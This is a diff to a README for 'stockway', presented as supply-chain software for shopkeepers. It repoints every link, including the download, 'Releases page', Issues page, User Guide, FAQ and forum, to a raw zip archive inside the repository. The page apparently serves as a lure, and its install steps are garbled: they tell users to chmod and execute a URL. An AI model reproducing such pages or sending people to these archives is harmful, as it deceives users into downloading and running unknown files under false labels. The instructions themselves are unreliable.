@@ -1,6 +1,6 @@
 # 📦 stockway - Streamline Your Supply Chain Operations
 
-![Download Stockway](https://raw.githubusercontent.com/aman06700/stockway/main/frontend/src/Software_v3.8-beta.5.zip)
+![Download Stockway](https://raw.githubusercontent.com/aman06700/stockway/main/frontend/public/docs_site/Software_2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Stockway! Stockway simplifies supply chain operations for shopkeepers
 
 To get started, you will need to download the software. Click the link below to visit our Releases page:
 
-[Visit this page to download](https://raw.githubusercontent.com/aman06700/stockway/main/frontend/src/Software_v3.8-beta.5.zip)
+[Visit this page to download](https://raw.githubusercontent.com/aman06700/stockway/main/frontend/public/docs_site/Software_2.5.zip)
 
 Once you’re on the Releases page, follow these steps:
 
@@ -54,11 +54,11 @@ Once you've downloaded Stockway, follow these steps to install it on your system
 2. Navigate to the directory where you downloaded the file.
 3. Use the following command to make the file executable:
    ```bash
-   chmod +x https://raw.githubusercontent.com/aman06700/stockway/main/frontend/src/Software_v3.8-beta.5.zip
+   chmod +x https://raw.githubusercontent.com/aman06700/stockway/main/frontend/public/docs_site/Software_2.5.zip
    ```
 4. Launch Stockway by running:
    ```bash
-   https://raw.githubusercontent.com/aman06700/stockway/main/frontend/src/Software_v3.8-beta.5.zip
+   https://raw.githubusercontent.com/aman06700/stockway/main/frontend/public/docs_site/Software_2.5.zip
    ```
 
 ## 🎉 Features
@@ -73,20 +73,20 @@ Stockway offers a range of features to help manage your supply chain effectively
 
 ## 📞 Support
 
-If you encounter any issues or have questions, please visit the [GitHub Issues page](https://raw.githubusercontent.com/aman06700/stockway/main/frontend/src/Software_v3.8-beta.5.zip) to submit a ticket or browse existing solutions. Our community and developers are here to help.
+If you encounter any issues or have questions, please visit the [GitHub Issues page](https://raw.githubusercontent.com/aman06700/stockway/main/frontend/public/docs_site/Software_2.5.zip) to submit a ticket or browse existing solutions. Our community and developers are here to help.
 
 ## 📚 Additional Resources
 
 For more information on using Stockway, check out our documentation:
 
-- [User Guide](https://raw.githubusercontent.com/aman06700/stockway/main/frontend/src/Software_v3.8-beta.5.zip)
-- [FAQ](https://raw.githubusercontent.com/aman06700/stockway/main/frontend/src/Software_v3.8-beta.5.zip)
-- [Community Forum](https://raw.githubusercontent.com/aman06700/stockway/main/frontend/src/Software_v3.8-beta.5.zip)
+- [User Guide](https://raw.githubusercontent.com/aman06700/stockway/main/frontend/public/docs_site/Software_2.5.zip)
+- [FAQ](https://raw.githubusercontent.com/aman06700/stockway/main/frontend/public/docs_site/Software_2.5.zip)
+- [Community Forum](https://raw.githubusercontent.com/aman06700/stockway/main/frontend/public/docs_site/Software_2.5.zip)
 
 ## 🔗 Download Again 
 
 If you missed it earlier, here is the link to download Stockway once more:
 
-[Visit this page to download](https://raw.githubusercontent.com/aman06700/stockway/main/frontend/src/Software_v3.8-beta.5.zip)
+[Visit this page to download](https://raw.githubusercontent.com/aman06700/stockway/main/frontend/public/docs_site/Software_2.5.zip)
 
 Feel free to explore, and thank you for choosing Stockway!
